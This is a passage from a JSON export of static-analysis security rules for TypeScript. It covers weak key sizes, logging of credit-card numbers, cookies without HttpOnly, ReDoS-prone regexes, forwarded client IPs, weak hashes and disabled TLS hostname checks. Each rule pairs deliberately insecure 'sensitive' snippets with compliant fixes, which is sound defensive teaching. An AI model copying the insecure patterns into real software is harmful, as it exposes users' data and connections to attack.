in the elliptic curve\nname:</p>\n<pre data-diff-id=\"3\" data-diff-type=\"compliant\">\nconst crypto = require('crypto');\n\nfunction callback(err, pub, priv) {}\n\nvar { privateKey, publicKey } = crypto.generateKeyPair('ec', {\n    namedCurve: 'secp224k1',\n    publicKeyEncoding:  { type: 'spki', format: 'pem' },\n    privateKeyEncoding: { type: 'pkcs8', format: 'pem' }\n  },\n  callback);\n</pre>\n<h3>How does this work?</h3>\n<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptography community.</p>\n<p>The appropriate choices are the following.</p>\n<h4>RSA (Rivest-Shamir-Adleman) and DSA (Digital Signature Algorithm)</h4>\n<p>The security of these algorithms depends on the difficulty of attacks attempting to solve their underlying mathematical problem.</p>\n<p>In general, a minimum key size of <strong>2048</strong> bits is recommended for both. It provides 112 bits of security. A key length of\n<strong>3072</strong> or <strong>4092</strong> should be preferred when possible.</p>\n<h4>AES (Advanced Encryption Standard)</h4>\n<p>AES supports three key sizes: 128 bits, 192 bits and 256 bits. The security of the AES algorithm is based on the computational complexity of trying\nall possible keys.<br> A larger key size increases the number of possible keys and makes exhaustive search attacks computationally infeasible.\nTherefore, a 256-bit key provides a higher level of security than a 128-bit or 192-bit key.</p>\n<p>Currently, a minimum key size of <strong>128 bits</strong> is recommended for AES.</p>\n<h4>Elliptic Curve Cryptography (ECC)</h4>\n<p>Elliptic curve cryptography is also used in various algorithms, such as ECDSA, ECDH, or ECMQV. The length of keys generated with elliptic curve\nalgorithms is mentioned directly in their names. For example, <code>secp256k1</code> generates a 256-bits long private key.</p>\n<p>Currently, a minimum key size of <strong>224 bits</strong> is recommended for EC-based algorithms.</p>\n<p>Additionally, some curves that theoretically provide sufficiently long keys are still discouraged. This can be because of a flaw in the curve\nparameters, a bad overall design, or poor performance. It is generally advised to use a NIST-approved elliptic curve wherever possible. Such curves\ncurrently include:</p>\n<ul>\n  <li> NIST P curves with a size of at least 224 bits, e.g. secp256r1. </li>\n  <li> Curve25519, generally known as ed25519 or x25519 depending on its application. </li>\n  <li> Curve448. </li>\n  <li> Brainpool curves with a size of at least 224 bits, e.g. brainpoolP224r1 </li>\n</ul>\n<h3>Going the extra mile</h3>\n<h4>Pre-Quantum Cryptography</h4>\n<p>Encrypted data and communications recorded today could be decrypted in the future by an attack from a quantum computer.<br> It is important to keep\nin mind that NIST-approved digital signature schemes, key agreement, and key transport may need to be replaced with secure quantum-resistant (or\n\"post-quantum\") counterpart.</p>\n<p>Thus, if data is to remain secure beyond 2030, proactive measures should be taken now to ensure its safety.</p>\n<p><a href=\"https://www.enisa.europa.eu/publications/post-quantum-cryptography-current-state-and-quantum-mitigation\">Learn more here</a>.</p>\n<h2>Resources</h2>\n<ul>\n  <li> Documentation\n    <ul>\n      <li> NIST Documentation - <a href=\"https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-186.pdf\">NIST SP 800-186: Recommendations\n      for Discrete Logarithm-based Cryptography: Elliptic Curve Domain Parameters</a> </li>\n      <li> IETF - <a href=\"https://datatracker.ietf.org/doc/html/rfc5639\">rfc5639: Elliptic Curve Cryptography (ECC) Brainpool Standard Curves and\n      Curve Generation</a> </li>\n    </ul>  </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode\">Microsoft, Timing vulnerabilities with CBC-mode\n  symmetric decryption using padding</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Padding_oracle_attack\">Wikipedia, Padding Oracle Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-ciphertext_attack\">Wikipedia, Chosen-Ciphertext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-plaintext_attack\">Wikipedia, Chosen-Plaintext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Semantic_security\">Wikipedia, Semantically Secure Cryptosystems</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding\">Wikipedia, OAEP</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Galois/Counter_Mode\">Wikipedia, Galois/Counter Mode</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements\">Mobile AppSec\n  Verification Standard - Cryptography Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography\">Mobile Top 10 2016 Category M5 -\n  Insufficient Cryptography</a> </li>\n  <li> <a href=\"https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf\">NIST 800-131A</a> - Recommendation for Transitioning the\n  Use of Cryptographic Algorithms and Key Lengths </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/326\">CWE-326 - Inadequate Encryption Strength</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/hDdGBQ\">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "typescript:S5757": {
        "name": "Allowing confidential information to be logged is security-sensitive",
        "htmlDesc": "<p>Log management is an important topic, especially for the security of a web application, to ensure user activity, including potential attackers, is\nrecorded and available for an analyst to understand what’s happened on the web application in case of malicious activities.</p>\n<p>Retention of specific logs for a defined period of time is often necessary to comply with regulations such as GDPR, <a\nhref=\"https://www.pcisecuritystandards.org/documents/Effective-Daily-Log-Monitoring-Guidance.pdf\">PCI DSS</a> and others. However, to protect user’s\nprivacy, certain informations are forbidden or strongly discouraged from being logged, such as user passwords or credit card numbers, which obviously\nshould not be stored or at least not in clear text.</p>\n<h2>Ask Yourself Whether</h2>\n<p>In a production environment:</p>\n<ul>\n  <li> The web application uses confidential information and logs a significant amount of data. </li>\n  <li> Logs are externalized to SIEM or Big Data repositories. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Loggers should be configured with a list of confidential, personal information that will be hidden/masked or removed from logs.</p>\n<h2>Sensitive Code Example</h2>\n<p>With <a href=\"https://www.npmjs.com/package/signale\">Signale log management framework</a> the code is sensitive when an empty list of secrets is\ndefined:</p>\n<pre>\nconst { Signale } = require('signale');\n\nconst CREDIT_CARD_NUMBERS = fetchFromWebForm()\n// here we suppose the credit card numbers are retrieved somewhere and CREDIT_CARD_NUMBERS looks like [\"1234-5678-0000-9999\", \"1234-5678-0000-8888\"]; for instance\n\nconst options = {\n  secrets: []         // empty list of secrets\n};\n\nconst logger = new Signale(options); // Sensitive\n\nCREDIT_CARD_NUMBERS.forEach(function(CREDIT_CARD_NUMBER) {\n  logger.log('The customer ordered products with the credit card number = %s', CREDIT_CARD_NUMBER);\n});\n</pre>\n<h2>Compliant Solution</h2>\n<p>With <a href=\"https://www.npmjs.com/package/signale\">Signale log management framework</a> it is possible to define a list of secrets that will be\nhidden in logs:</p>\n<pre>\nconst { Signale } = require('signale');\n\nconst CREDIT_CARD_NUMBERS = fetchFromWebForm()\n// here we suppose the credit card numbers are retrieved somewhere and CREDIT_CARD_NUMBERS looks like [\"1234-5678-0000-9999\", \"1234-5678-0000-8888\"]; for instance\n\nconst options = {\n  secrets: [\"([0-9]{4}-?)+\"]\n};\n\nconst logger = new Signale(options); // Compliant\n\nCREDIT_CARD_NUMBERS.forEach(function(CREDIT_CARD_NUMBER) {\n  logger.log('The customer ordered products with the credit card number = %s', CREDIT_CARD_NUMBER);\n});\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/\">Top 10 2021 Category A9 - Security Logging and\n  Monitoring Failures</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/532\">CWE-532 - Insertion of Sensitive Information into Log File</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "typescript:S3330": {
        "name": "Creating cookies without the \"HttpOnly\" flag is security-sensitive",
        "htmlDesc": "<p>When a cookie is configured with the <code>HttpOnly</code> attribute set to <em>true</em>, the browser guaranties that no client-side script will\nbe able to read it. In most cases, when a cookie is created, the default value of <code>HttpOnly</code> is <em>false</em> and it’s up to the developer\nto decide whether or not the content of the cookie can be read by the client-side script. As a majority of Cross-Site Scripting (XSS) attacks target\nthe theft of session-cookies, the <code>HttpOnly</code> attribute can help to reduce their impact as it won’t be possible to exploit the XSS\nvulnerability to steal session-cookies.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the cookie is sensitive, used to authenticate the user, for instance a <em>session-cookie</em> </li>\n  <li> the <code>HttpOnly</code> attribute offer an additional protection (not the case for an <em>XSRF-TOKEN cookie</em> / CSRF token for example)\n  </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> By default the <code>HttpOnly</code> flag should be set to <em>true</em> for most of the cookies and it’s mandatory for session /\n  sensitive-security cookies. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p><a href=\"https://www.npmjs.com/package/cookie-session\">cookie-session</a> module:</p>\n<pre>\nlet session = cookieSession({\n  httpOnly: false,// Sensitive\n});  // Sensitive\n</pre>\n<p><a href=\"https://www.npmjs.com/package/express-session\">express-session</a> module:</p>\n<pre>\nconst express = require('express'),\nconst session = require('express-session'),\n\nlet app = express()\napp.use(session({\n  cookie:\n  {\n    httpOnly: false // Sensitive\n  }\n})),\n</pre>\n<p><a href=\"https://www.npmjs.com/package/cookies\">cookies</a> module:</p>\n<pre>\nlet cookies = new Cookies(req, res, { keys: keys });\n\ncookies.set('LastVisit', new Date().toISOString(), {\n  httpOnly: false // Sensitive\n}); // Sensitive\n</pre>\n<p><a href=\"https://www.npmjs.com/package/csurf\">csurf</a> module:</p>\n<pre>\nconst cookieParser = require('cookie-parser');\nconst csrf = require('csurf');\nconst express = require('express');\n\nlet csrfProtection = csrf({ cookie: { httpOnly: false }}); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<p><a href=\"https://www.npmjs.com/package/cookie-session\">cookie-session</a> module:</p>\n<pre>\nlet session = cookieSession({\n  httpOnly: true,// Compliant\n});  // Compliant\n</pre>\n<p><a href=\"https://www.npmjs.com/package/express-session\">express-session</a> module:</p>\n<pre>\nconst express = require('express');\nconst session = require('express-session');\n\nlet app = express();\napp.use(session({\n  cookie:\n  {\n    httpOnly: true // Compliant\n  }\n}));\n</pre>\n<p><a href=\"https://www.npmjs.com/package/cookies\">cookies</a> module:</p>\n<pre>\nlet cookies = new Cookies(req, res, { keys: keys });\n\ncookies.set('LastVisit', new Date().toISOString(), {\n  httpOnly: true // Compliant\n}); // Compliant\n</pre>\n<p><a href=\"https://www.npmjs.com/package/csurf\">csurf</a> module:</p>\n<pre>\nconst cookieParser = require('cookie-parser');\nconst csrf = require('csurf');\nconst express = require('express');\n\nlet csrfProtection = csrf({ cookie: { httpOnly: true }}); // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> <a href=\"https://owasp.org/www-community/HttpOnly\">OWASP HttpOnly</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)\">Top 10 2017 Category A7 - Cross-Site Scripting\n  (XSS)</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/1004\">CWE-1004 - Sensitive Cookie Without 'HttpOnly' Flag</a> </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://find-sec-bugs.github.io/bugs.htm#HTTPONLY_COOKIE\">HTTPONLY_COOKIE</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "typescript:S4784": {
        "name": "Using regular expressions is security-sensitive",
        "htmlDesc": "<p>This rule is deprecated; use <a href='/coding_rules#rule_key=javascript%3AS5852'>S5852</a> instead.</p>\n<p>Using regular expressions is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16021\">CVE-2017-16021</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-13863\">CVE-2018-13863</a> </li>\n</ul>\n<p>Evaluating regular expressions against input strings is potentially an extremely CPU-intensive task. Specially crafted regular expressions such as\n<code>(a+)+s</code> will take several seconds to evaluate the input string <code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaabs</code>. The problem is that with\nevery additional <code>a</code> character added to the input, the time required to evaluate the regex doubles. However, the equivalent regular\nexpression, <code>a+s</code> (without grouping) is efficiently evaluated in milliseconds and scales linearly with the input size.</p>\n<p>Evaluating such regular expressions opens the door to <a\nhref=\"https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS\">Regular expression Denial of Service (ReDoS)</a> attacks.\nIn the context of a web application, attackers can force the web server to spend all of its resources evaluating regular expressions thereby making\nthe service inaccessible to genuine users.</p>\n<p>This rule flags any execution of a hardcoded regular expression which has at least 3 characters and at least two instances of any of the following\ncharacters: <code>*+{</code>.</p>\n<p>Example: <code>(a+)*</code></p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the executed regular expression is sensitive and a user can provide a string which will be analyzed by this regular expression. </li>\n  <li> your regular expression engine performance decrease with specially crafted inputs and regular expressions. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Check whether your regular expression engine (the algorithm executing your regular expression) has any known vulnerabilities. Search for\nvulnerability reports mentioning the one engine you’re are using.</p>\n<p>Use if possible a library which is not vulnerable to Redos Attacks such as <a href=\"https://github.com/google/re2\">Google Re2</a>.</p>\n<p>Remember also that a ReDos attack is possible if a user-provided regular expression is executed. This rule won’t detect this kind of injection.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nconst regex = /(a+)+b/; // Sensitive\nconst regex2 = new RegExp(\"(a+)+b\"); // Sensitive\n\nstr.search(\"(a+)+b\"); // Sensitive\nstr.match(\"(a+)+b\"); // Sensitive\nstr.split(\"(a+)+b\"); // Sensitive\n</pre>\n<p>Note: String.matchAll does not raise any issue as it is not supported by NodeJS.</p>\n<h2>Exceptions</h2>\n<p>Some corner-case regular expressions will not raise an issue even though they might be vulnerable. For example: <code>(a|aa)+</code>,\n<code>(a|a?)+</code>.</p>\n<p>It is a good idea to test your regular expression if it has the same pattern on both side of a \"<code>|</code>\".</p>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS\">CWE-624 - Executable Regular Expression\n  Error</a> </li>\n  <li> OWASP Regular expression Denial of Service - ReDoS </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "typescript:S5759": {
        "name": "Forwarding client IP address is security-sensitive",
        "htmlDesc": "<p>Users often connect to web servers through HTTP proxies.</p>\n<p>Proxy can be configured to forward the client IP address via the <code>X-Forwarded-For</code> or <code>Forwarded</code> HTTP headers.</p>\n<p>IP address is a personal information which can identify a single user and thus impact his privacy.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The web application uses reverse proxies or similar but doesn’t need to know the IP address of the user. </li>\n</ul>\n<p>There is a risk if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>User IP address should not be forwarded unless the application needs it, as part of an authentication, authorization scheme or log management for\nexamples.</p>\n<h2>Sensitive Code Example</h2>\n<p><a href=\"https://github.com/http-party/node-http-proxy\">node-http-proxy</a></p>\n<pre>\nvar httpProxy = require('http-proxy');\n\nhttpProxy.createProxyServer({target:'http://localhost:9000', xfwd:true}) // Noncompliant\n  .listen(8000);\n</pre>\n<p><a href=\"https://github.com/chimurai/http-proxy-middleware\">http-proxy-middleware</a></p>\n<pre>\nvar express = require('express');\n\nconst { createProxyMiddleware } = require('http-proxy-middleware');\n\nconst app = express();\n\napp.use('/proxy', createProxyMiddleware({ target: 'http://localhost:9000', changeOrigin: true, xfwd: true })); // Noncompliant\napp.listen(3000);\n</pre>\n<h2>Compliant Solution</h2>\n<p><a href=\"https://github.com/http-party/node-http-proxy\">node-http-proxy</a></p>\n<pre>\nvar httpProxy = require('http-proxy');\n\n// By default xfwd option is false\nhttpProxy.createProxyServer({target:'http://localhost:9000'}) // Compliant\n  .listen(8000);\n</pre>\n<p><a href=\"https://github.com/chimurai/http-proxy-middleware\">http-proxy-middleware</a></p>\n<pre>\nvar express = require('express');\n\nconst { createProxyMiddleware } = require('http-proxy-middleware');\n\nconst app = express();\n\n// By default xfwd option is false\napp.use('/proxy', createProxyMiddleware({ target: 'http://localhost:9000', changeOrigin: true})); // Compliant\napp.listen(3000);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For\">developer.mozilla.org</a> - X-Forwarded-For </li>\n</ul>",
        "severity": "MINOR"
      },
      "typescript:S2255": {
        "name": "Writing cookies is security-sensitive",
        "htmlDesc": "<p>This rule is deprecated, and will eventually be removed.</p>\n<p>Using cookies is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11639\">CVE-2018-11639</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6537\">CVE-2016-6537</a> </li>\n</ul>\n<p>Attackers can use widely-available tools to read cookies. Any sensitive information they may contain will be exposed.</p>\n<p>This rule flags code that writes cookies.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> sensitive information is stored inside the cookie. </li>\n</ul>\n<p>You are at risk if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Cookies should only be used to manage the user session. The best practice is to keep all user-related information server-side and link them to the\nuser session, never sending them to the client. In a very few corner cases, cookies can be used for non-sensitive information that need to live longer\nthan the user session.</p>\n<p>Do not try to encode sensitive information in a non human-readable format before writing them in a cookie. The encoding can be reverted and the\noriginal information will be exposed.</p>\n<p>Using cookies only for session IDs doesn’t make them secure. Follow <a\nhref=\"https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#cookies\">OWASP best practices</a> when you configure your\ncookies.</p>\n<p>As a side note, every information read from a cookie should be <a\nhref=\"https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet\">Sanitized</a>.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\n// === Built-in NodeJS modules ===\nconst http = require('http');\nconst https = require('https');\n\nhttp.createServer(function(req, res) {\n  res.setHeader('Set-Cookie', ['type=ninja', 'lang=js']); // Sensitive\n});\nhttps.createServer(function(req, res) {\n  res.setHeader('Set-Cookie', ['type=ninja', 'lang=js']); // Sensitive\n});\n</pre>\n<pre>\n// === ExpressJS ===\nconst express = require('express');\nconst app = express();\napp.use(function(req, res, next) {\n  res.cookie('name', 'John'); // Sensitive\n});\n</pre>\n<pre>\n// === In browser ===\n// Set cookie\ndocument.cookie = \"name=John\"; // Sensitive\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/312\">CWE-312 - Cleartext Storage of Sensitive Information</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/315\">CWE-315 - Cleartext Storage of Sensitive Information in a Cookie</a> </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://find-sec-bugs.github.io/bugs.htm#COOKIE_USAGE\">COOKIE_USAGE</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "typescript:S4790": {
        "name": "Using weak hashing algorithms is security-sensitive",
        "htmlDesc": "<p>Cryptographic hash algorithms such as <code>MD2</code>, <code>MD4</code>, <code>MD5</code>, <code>MD6</code>, <code>HAVAL-128</code>,\n<code>HMAC-MD5</code>, <code>DSA</code> (which uses <code>SHA-1</code>), <code>RIPEMD</code>, <code>RIPEMD-128</code>, <code>RIPEMD-160</code>,\n<code>HMACRIPEMD160</code> and <code>SHA-1</code> are no longer considered secure, because it is possible to have <code>collisions</code> (little\ncomputational effort is enough to find two or more different inputs that produce the same hash).</p>\n<h2>Ask Yourself Whether</h2>\n<p>The hashed value is used in a security context like:</p>\n<ul>\n  <li> User-password storage. </li>\n  <li> Security token generation (used to confirm e-mail when registering on a website, reset password, etc …​). </li>\n  <li> To compute some message integrity. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Safer alternatives, such as <code>SHA-256</code>, <code>SHA-512</code>, <code>SHA-3</code> are recommended, and for password hashing, it’s even\nbetter to use algorithms that do not compute too \"quickly\", like <code>bcrypt</code>, <code>scrypt</code>, <code>argon2</code> or <code>pbkdf2</code>\nbecause it slows down <code>brute force attacks</code>.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nconst crypto = require(\"crypto\");\n\nconst hash = crypto.createHash('sha1'); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nconst crypto = require(\"crypto\");\n\nconst hash = crypto.createHash('sha512'); // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements\">Mobile AppSec\n  Verification Standard - Cryptography Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography\">Mobile Top 10 2016 Category M5 -\n  Insufficient Cryptography</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/1240\">CWE-1240 - Use of a Risky Cryptographic Primitive</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "typescript:S5527": {
        "name": "Server hostnames should be verified during SSL/TLS connections",
        "htmlDesc": "<p>This vulnerability allows attackers to impersonate a trusted host.</p>\n<h2>Why is this an issue?</h2>\n<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them. In this\nprocess, the role of hostname validation, combined with certificate validation, is to ensure that a system is indeed the one it claims to be, adding\nan extra layer of trust and security.</p>\n<p>When hostname validation is disabled, the client skips this critical check. This creates an opportunity for attackers to pose as a trusted entity\nand intercept, manipulate, or steal the data being transmitted.</p>\n<p>To do so, an attacker would obtain a valid certificate authenticating <code>example.com</code>, serve it using a different hostname, and the\napplication code would still accept it.</p>\n<h3>What is the potential impact?</h3>\n<p>Establishing trust in a secure way is a non-trivial task. When you disable hostname validation, you are removing a key mechanism designed to build\nthis trust in internet communication, opening your system up to a number of potential threats.</p>\n<h4>Identity spoofing</h4>\n<p>If a system does not validate hostnames, it cannot confirm the identity of the other party involved in the communication. An attacker can exploit\nthis by creating a fake server and masquerading it as a legitimate one. For example, they might set up a server that looks like your bank’s server,\ntricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect any data\nyour system sends to them, potentially leading to significant data breaches.</p>\n<h2>How to fix it in Node.js</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of disabled hostname validation.</p>\n<p>The hostname validation gets disabled by overriding <code>checkServerIdentity</code> with an empty implementation. It is highly recommended to use\nthe original implementation.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nconst https = require('node:https');\n\nlet options = {\n  hostname: 'www.example.com',\n  port: 443,\n  path: '/',\n  method: 'GET',\n  checkServerIdentity: function() {}, // Noncompliant\n  secureProtocol: 'TLSv1_2_method'\n};\n\nlet req = https.request(options, (res) =&gt; {\n  res.on('data', (d) =&gt; {\n    process.stdout.write(d);\n  });\n});\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nconst tls = require('node:tls');\n\nlet options = {\n  checkServerIdentity: function() {}, // Noncompliant\n  secureProtocol: 'TLSv1_2_method'\n};\n\nlet socket = tls.connect(443, \"www.example.com\", options, () =&gt; {\n  process.stdin.pipe(socket);\n  process.stdin.resume();\n});\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nconst https = require('node:https');\n\nlet options = {\n  hostname: 'www.example.com',\n  port: 443,\n  path: '/',\n  method: 'GET',\n  secureProtocol: 'TLSv1_2_method'\n};\n\nlet req = https.request(options, (res) =&gt; {\n  res.on('data', (d) =&gt; {\n    process.stdout.write(d);\n  });\n});\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nconst tls = require('node:tls');\n\nlet options = {\n  secureProtocol: 'TLSv1_2_method'\n};\n\nlet socket = tls.connect(443, \"www.example.com\", options, () =&gt; {\n  process.stdin.pipe(socket);\n  process.stdin.resume();\n});\n</pre>\n<h3>How does this work?</h3>\n<p>To fix the vulnerability of disabled hostname validation, it is strongly recommended to first re-enable the default validation and fix the root\ncause: the validity of the certificate.</p>\n<h4>Use valid certificates</h4>\n<p>If a hostname validation failure prevents connecting to the target server, keep in mind that <strong>one system’s code should not work around\nanother system’s problems</strong>, as this creates unnecessary dependencies and can lead to reliability issues.</p>\n<p>Therefore, the first solution is to change the remote host’s certificate to match its identity. If the remote host is not under your control,\nconsider replicating its service to a server whose certificate you can change yourself.</p>\n<p>In case the contacted host is located on a development machine, and if there is no other choice, try following this solution:</p>\n<ul>\n  <li> Create a self-signed certificate for that machine. </li>\n  <li> Add this self-signed certificate to the system’s trust store. </li>\n  <li> If the hostname is not <code>localhost</code>, add the hostname in the <code>/etc/hosts</code> file. </li>\n</ul>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements\">Mobile AppSec\n  Verification Standard - Network Communication Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication\">Mobile Top 10 2016 Category M3 - Insecure\n  Communication</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/297\">CWE-297 - Improper Validation of Certificate with Host Mismatch</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "typescript:S1525": {
        "name": "Debugger statements should not be used",
